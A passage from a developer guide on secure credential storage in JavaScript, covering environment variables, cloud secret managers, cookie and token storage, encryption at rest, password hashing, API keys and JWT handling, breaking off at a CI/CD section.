  } catch (error) {
    if (!navigator.onLine) {
      // User is offline
      showOfflineMessage();
    } else {
      // Other network error
      throw error;
    }
  }
}
```

---

## Secure Credential Storage

### Environment Variables

The most common approach for storing credentials outside of code.

**Basic usage:**

```javascript
// .env file (never commit to version control)
API_KEY=sk_live_abc123xyz789
DATABASE_URL=postgresql://user:password@localhost:5432/db
JWT_SECRET=your-secret-key-here
STRIPE_SECRET_KEY=sk_test_xxxxx

// Access in Node.js with dotenv
require('dotenv').config();

const apiKey = process.env.API_KEY;
const dbUrl = process.env.DATABASE_URL;
```

**Security rules:**

- Add `.env` to `.gitignore`
- Never hardcode credentials in source code
- Use different credentials per environment (dev/staging/prod)
- Rotate credentials regularly

**.gitignore example:**

```
.env
.env.local
.env.*.local
config/credentials.json
secrets/
```

**Environment-specific files:**

```bash
.env.development
.env.test
.env.production
```

```javascript
// Load based on NODE_ENV
require('dotenv').config({
  path: `.env.${process.env.NODE_ENV || 'development'}`
});
```

### Secret Management Services

**AWS Secrets Manager:**

```javascript
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');

const client = new SecretsManagerClient({ region: 'us-east-1' });

async function getSecret(secretName) {
  try {
    const command = new GetSecretValueCommand({ SecretId: secretName });
    const data = await client.send(command);
    
    if (data.SecretString) {
      return JSON.parse(data.SecretString);
    }
  } catch (error) {
    console.error('Error retrieving secret:', error);
    throw error;
  }
}

// Usage
const dbCredentials = await getSecret('prod/database/credentials');
const { username, password, host } = dbCredentials;
```

**Azure Key Vault:**

```javascript
const { SecretClient } = require('@azure/keyvault-secrets');
const { DefaultAzureCredential } = require('@azure/identity');

const vaultUrl = `https://${process.env.KEY_VAULT_NAME}.vault.azure.net`;
const credential = new DefaultAzureCredential();
const client = new SecretClient(vaultUrl, credential);

async function getSecret(secretName) {
  try {
    const secret = await client.getSecret(secretName);
    return secret.value;
  } catch (error) {
    console.error('Error retrieving secret:', error);
    throw error;
  }
}

// Usage
const apiKey = await getSecret('api-key');
```

**Google Cloud Secret Manager:**

```javascript
const { SecretManagerServiceClient } = require('@google-cloud/secret-manager');

const client = new SecretManagerServiceClient();

async function getSecret(projectId, secretName, version = 'latest') {
  const name = `projects/${projectId}/secrets/${secretName}/versions/${version}`;
  
  try {
    const [response] = await client.accessSecretVersion({ name });
    const payload = response.payload.data.toString('utf8');
    return payload;
  } catch (error) {
    console.error('Error accessing secret:', error);
    throw error;
  }
}

// Usage
const apiKey = await getSecret('my-project', 'api-key');
```

**HashiCorp Vault:**

```javascript
const vault = require('node-vault')({
  apiVersion: 'v1',
  endpoint: process.env.VAULT_ADDR,
  token: process.env.VAULT_TOKEN
});

async function getSecret(path) {
  try {
    const result = await vault.read(path);
    return result.data;
  } catch (error) {
    console.error('Error reading from Vault:', error);
    throw error;
  }
}

// Usage
const credentials = await getSecret('secret/data/myapp/database');
const { username, password } = credentials.data;
```

### Client-Side Credential Storage

**Never store sensitive credentials in:**

- LocalStorage
- SessionStorage
- Cookies without proper flags
- Client-side code
- Browser memory beyond session duration

**Token storage patterns:**

**In-memory storage (most secure for SPAs):**

```javascript
// Store tokens in closure
const TokenStore = (() => {
  let accessToken = null;
  let refreshToken = null;
  
  return {
    setTokens(access, refresh) {
      accessToken = access;
      refreshToken = refresh;
    },
    
    getAccessToken() {
      return accessToken;
    },
    
    getRefreshToken() {
      return refreshToken;
    },
    
    clearTokens() {
      accessToken = null;
      refreshToken = null;
    }
  };
})();

// Use with fetch
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${TokenStore.getAccessToken()}`
  }
});
```

**HttpOnly cookies (recommended for web apps):**

```javascript
// Server-side (Node.js/Express)
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Authenticate user...
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);
  
  // Set HttpOnly cookies
  res.cookie('accessToken', accessToken, {
    httpOnly: true,      // Prevents JavaScript access
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 15 * 60 * 1000  // 15 minutes
  });
  
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });
  
  res.json({ success: true });
});

// Client-side fetch (cookies sent automatically)
fetch('/api/data', {
  credentials: 'include'  // Include cookies
});
```

**Secure cookie configuration:**

```javascript
const cookieOptions = {
  httpOnly: true,           // No JavaScript access
  secure: true,             // HTTPS only (set to false in dev if using HTTP)
  sameSite: 'strict',       // Strict CSRF protection
  domain: '.example.com',   // Subdomain sharing if needed
  path: '/',                // Cookie path
  maxAge: 3600000          // 1 hour in milliseconds
};

// For refresh tokens (longer duration)
const refreshCookieOptions = {
  ...cookieOptions,
  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
  path: '/auth/refresh'              // Limit to refresh endpoint only
};
```

### Encryption at Rest

**Encrypting sensitive data in database:**

```javascript
const crypto = require('crypto');

class CredentialEncryption {
  constructor(encryptionKey) {
    // Key should be 32 bytes for AES-256
    this.algorithm = 'aes-256-gcm';
    this.key = Buffer.from(encryptionKey, 'hex');
  }
  
  encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    // Return IV, authTag, and encrypted data together
    return {
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex'),
      encrypted: encrypted
    };
  }
  
  decrypt(encryptedData) {
    const decipher = crypto.createDecipheriv(
      this.algorithm,
      this.key,
      Buffer.from(encryptedData.iv, 'hex')
    );
    
    decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
    
    let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}

// Usage
const encryptionKey = process.env.ENCRYPTION_KEY; // 64 hex characters
const encryption = new CredentialEncryption(encryptionKey);

// Store in database
const apiKey = 'sk_live_abc123';
const encrypted = encryption.encrypt(apiKey);
await db.storeCredential({
  userId: user.id,
  iv: encrypted.iv,
  authTag: encrypted.authTag,
  encryptedValue: encrypted.encrypted
});

// Retrieve from database
const stored = await db.getCredential(user.id);
const decrypted = encryption.decrypt({
  iv: stored.iv,
  authTag: stored.authTag,
  encrypted: stored.encryptedValue
});
```

**Key derivation for user-specific encryption:**

```javascript
const crypto = require('crypto');

function deriveKey(masterKey, userId, salt) {
  return crypto.pbkdf2Sync(
    `${masterKey}:${userId}`,
    salt,
    100000,  // iterations
    32,      // key length
    'sha256'
  );
}

// Usage
const masterKey = process.env.MASTER_ENCRYPTION_KEY;
const salt = crypto.randomBytes(16);
const userKey = deriveKey(masterKey, user.id, salt);

// Store salt with encrypted data
await db.storeCredential({
  userId: user.id,
  salt: salt.toString('hex'),
  encrypted: encrypt(apiKey, userKey)
});
```

### Password Hashing

**Never store passwords in plain text or use reversible encryption.**

**bcrypt (recommended):**

```javascript
const bcrypt = require('bcrypt');

// Hash password
async function hashPassword(password) {
  const saltRounds = 12;  // Higher = more secure but slower
  const hash = await bcrypt.hash(password, saltRounds);
  return hash;
}

// Verify password
async function verifyPassword(password, hash) {
  const match = await bcrypt.compare(password, hash);
  return match;
}

// Usage in registration
app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  
  const hashedPassword = await hashPassword(password);
  
  await db.users.create({
    username,
    password: hashedPassword
  });
  
  res.json({ success: true });
});

// Usage in login
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.users.findOne({ username });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const isValid = await verifyPassword(password, user.password);
  
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate token...
  res.json({ token });
});
```

**Argon2 (newer, more secure):**

```javascript
const argon2 = require('argon2');

// Hash password
async function hashPassword(password) {
  try {
    const hash = await argon2.hash(password, {
      type: argon2.argon2id,  // Recommended variant
      memoryCost: 65536,      // 64 MB
      timeCost: 3,            // Iterations
      parallelism: 4          // Threads
    });
    return hash;
  } catch (error) {
    console.error('Hashing error:', error);
    throw error;
  }
}

// Verify password
async function verifyPassword(password, hash) {
  try {
    return await argon2.verify(hash, password);
  } catch (error) {
    console.error('Verification error:', error);
    return false;
  }
}
```

### API Key Management

**Generating secure API keys:**

```javascript
const crypto = require('crypto');

function generateApiKey(prefix = 'sk') {
  const randomBytes = crypto.randomBytes(32);
  const key = randomBytes.toString('base64url');
  return `${prefix}_${key}`;
}

// Usage
const apiKey = generateApiKey('live'); // live_xxxxxxxxxxxxx
```

**Storing API keys with hashing:**

```javascript
const crypto = require('crypto');

function hashApiKey(apiKey) {
  return crypto
    .createHash('sha256')
    .update(apiKey)
    .digest('hex');
}

// When user generates API key
app.post('/api/keys', async (req, res) => {
  const apiKey = generateApiKey();
  const hashedKey = hashApiKey(apiKey);
  
  await db.apiKeys.create({
    userId: req.user.id,
    keyHash: hashedKey,
    prefix: apiKey.substring(0, 10),  // For user identification
    createdAt: new Date()
  });
  
  // Show key only once
  res.json({ 
    apiKey,
    message: 'Save this key securely. It will not be shown again.' 
  });
});

// When validating API key
async function validateApiKey(providedKey) {
  const hashedKey = hashApiKey(providedKey);
  const apiKeyRecord = await db.apiKeys.findOne({ keyHash: hashedKey });
  
  if (!apiKeyRecord) {
    return null;
  }
  
  // Update last used timestamp
  await db.apiKeys.update(
    { id: apiKeyRecord.id },
    { lastUsed: new Date() }
  );
  
  return apiKeyRecord.userId;
}
```

**API key middleware:**

```javascript
async function apiKeyAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing API key' });
  }
  
  const apiKey = authHeader.substring(7);
  
  try {
    const userId = await validateApiKey(apiKey);
    
    if (!userId) {
      return res.status(401).json({ error: 'Invalid API key' });
    }
    
    req.userId = userId;
    next();
  } catch (error) {
    console.error('API key validation error:', error);
    res.status(500).json({ error: 'Authentication error' });
  }
}

// Usage
app.get('/api/protected', apiKeyAuth, (req, res) => {
  res.json({ message: 'Access granted', userId: req.userId });
});
```

### JWT Token Security

**Token generation and validation:**

```javascript
const jwt = require('jsonwebtoken');

// Generate access token (short-lived)
function generateAccessToken(userId, claims = {}) {
  return jwt.sign(
    { 
      userId,
      type: 'access',
      ...claims
    },
    process.env.JWT_SECRET,
    { 
      expiresIn: '15m',
      issuer: 'your-app-name',
      audience: 'your-app-users'
    }
  );
}

// Generate refresh token (long-lived)
function generateRefreshToken(userId) {
  const tokenId = crypto.randomBytes(16).toString('hex');
  
  return jwt.sign(
    { 
      userId,
      type: 'refresh',
      tokenId
    },
    process.env.JWT_REFRESH_SECRET,
    { 
      expiresIn: '7d',
      issuer: 'your-app-name'
    }
  );
}

// Verify token
function verifyAccessToken(token) {
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      issuer: 'your-app-name',
      audience: 'your-app-users'
    });
    
    if (decoded.type !== 'access') {
      throw new Error('Invalid token type');
    }
    
    return decoded;
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      throw new Error('Token expired');
    }
    if (error.name === 'JsonWebTokenError') {
      throw new Error('Invalid token');
    }
    throw error;
  }
}
```

**Token refresh flow:**

```javascript
// Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
    
    // Check if token is revoked
    const isRevoked = await db.revokedTokens.exists(decoded.tokenId);
    if (isRevoked) {
      return res.status(401).json({ error: 'Token revoked' });
    }
    
    // Generate new access token
    const newAccessToken = generateAccessToken(decoded.userId);
    
    res.cookie('accessToken', newAccessToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });
    
    res.json({ success: true });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

**Token revocation:**

```javascript
// Store token IDs in database or Redis
const tokenRevocationList = new Set();

function revokeToken(tokenId) {
  tokenRevocationList.add(tokenId);
  // Or store in Redis/database with expiration
}

function isTokenRevoked(tokenId) {
  return tokenRevocationList.has(tokenId);
}

// Logout endpoint
app.post('/auth/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (refreshToken) {
    try {
      const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
      revokeToken(decoded.tokenId);
    } catch (error) {
      // Token already invalid
    }
  }
  
  res.clearCookie('accessToken');
  res.clearCookie('refreshToken');
  res.json({ success: true });
});
```

### Secrets in CI/CD Pipelines

**GitHub Actions:**

```yaml
